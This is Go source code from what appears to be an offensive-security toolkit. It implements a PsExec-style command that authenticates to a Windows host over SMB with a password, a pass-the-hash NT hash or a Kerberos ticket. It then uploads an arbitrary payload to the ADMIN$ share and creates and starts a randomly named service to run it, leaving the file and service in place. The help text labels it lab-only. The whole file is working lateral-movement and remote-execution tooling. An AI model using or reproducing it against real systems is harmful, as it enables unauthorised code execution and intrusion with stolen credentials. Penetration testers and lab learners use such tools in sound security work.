package preimplant

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"regexp"

	"github.com/KKingZero/ARK/pkg/scmr"
	"github.com/KKingZero/ARK/pkg/smbcli"
)

const maxPsExecPayload = 16 << 20

var serviceNameRE = regexp.MustCompile(`^[A-Za-z0-9_]{1,32}$`)

const psexecUsage = `ark psexec — host SCMR service create (no implant)

  ark psexec --host H --user U --pass-file P --payload FILE [--service NAME]
  ark psexec --host H --user U --domain D --hash NT --kerberos --payload FILE
  ark psexec --host H --ticket ID --payload FILE [--hostname dc.lab.htb]

Uploads FILE to ADMIN$\NAME.exe and creates a demand-start service whose
binary path is C:\Windows\NAME.exe. NAME defaults to 8 hex characters.
Does not delete the service or the uploaded file. ERROR_SERVICE_EXISTS (1073) fails.
--kerberos asks a TGT then uses native Kerberos SMB. An existing --ticket wins.
Honors ARK_PROXY / ALL_PROXY (SOCKS5). Lab-only.
`

// RunPsExec stages a payload to ADMIN$ and starts it via MS-SCMR.
func RunPsExec(args []string) error {
	if len(args) > 0 && (args[0] == "help" || args[0] == "-h" || args[0] == "--help") {
		fmt.Print(psexecUsage)
		return nil
	}
	f, _ := ParseFlags(args)
	plan, err := planPsExec(f)
	if err != nil {
		return err
	}
	if plan.Service == "" {
		name, err := randomServiceName()
		if err != nil {
			return err
		}
		plan = applyServiceName(plan, name)
	}
	data, err := readPayload(plan.Payload)
	if err != nil {
		return err
	}
	opts, err := applyKerberosSMB(plan.Opts, plan.Kerberos)
	if err != nil {
		return err
	}
	printProxyHint()
	s, err := smbcli.Dial(opts)
	if err != nil {
		return err
	}
	defer s.Close()
	if err := s.Upload("ADMIN$", plan.Remote, data); err != nil {
		return err
	}
	if err := scmr.CreateAndStart(s, plan.Machine, plan.Service, plan.Binary); err != nil {
		return err
	}
	fmt.Printf("service %s\n", plan.Service)
	fmt.Printf("binary %s\n", plan.Binary)
	return nil
}

type psexecPlan struct {
	Opts     smbcli.Options
	Kerberos bool
	Payload  string
	Service  string
	Remote   string
	Binary   string
	Machine  string
}

func planPsExec(f map[string]string) (psexecPlan, error) {
	opts, err := smbOpts(f)
	if err != nil {
		return psexecPlan{}, err
	}
	kerberos := flagBool(f, "kerberos")
	if _, err := planKerberosSMB(opts, kerberos); err != nil {
		return psexecPlan{}, err
	}
	if !kerberos && opts.Ticket == "" {
		if opts.Username == "" || (opts.Password == "" && opts.Hash == "") {
			return psexecPlan{}, fmt.Errorf("--user and --pass-file or --hash required (or --ticket)")
		}
	}
	payload := f["payload"]
	if payload == "" {
		return psexecPlan{}, fmt.Errorf("--payload required")
	}
	p := psexecPlan{
		Opts:     opts,
		Kerberos: kerberos,
		Payload:  payload,
		Machine:  `\\` + scMachine(opts),
	}
	if name := f["service"]; name != "" {
		if !serviceNameRE.MatchString(name) {
			return psexecPlan{}, fmt.Errorf("--service must match [A-Za-z0-9_]{1,32}")
		}
		p = applyServiceName(p, name)
	}
	return p, nil
}

func applyServiceName(p psexecPlan, name string) psexecPlan {
	p.Service = name
	p.Remote = name + ".exe"
	p.Binary = `C:\Windows\` + name + ".exe"
	return p
}

func scMachine(o smbcli.Options) string {
	if o.Hostname != "" {
		return o.Hostname
	}
	return stripSMBPort(o.Host)
}

func randomServiceName() (string, error) {
	var b [4]byte
	if _, err := rand.Read(b[:]); err != nil {
		return "", err
	}
	return hex.EncodeToString(b[:]), nil
}

func readPayload(path string) ([]byte, error) {
	st, err := os.Stat(path)
	if err != nil {
		return nil, err
	}
	if st.Size() == 0 {
		return nil, fmt.Errorf("payload is empty")
	}
	if st.Size() > maxPsExecPayload {
		return nil, fmt.Errorf("payload too large: max %d bytes", maxPsExecPayload)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	if len(data) == 0 {
		return nil, fmt.Errorf("payload is empty")
	}
	if len(data) > maxPsExecPayload {
		return nil, fmt.Errorf("payload too large: max %d bytes", maxPsExecPayload)
	}
	return data, nil
}
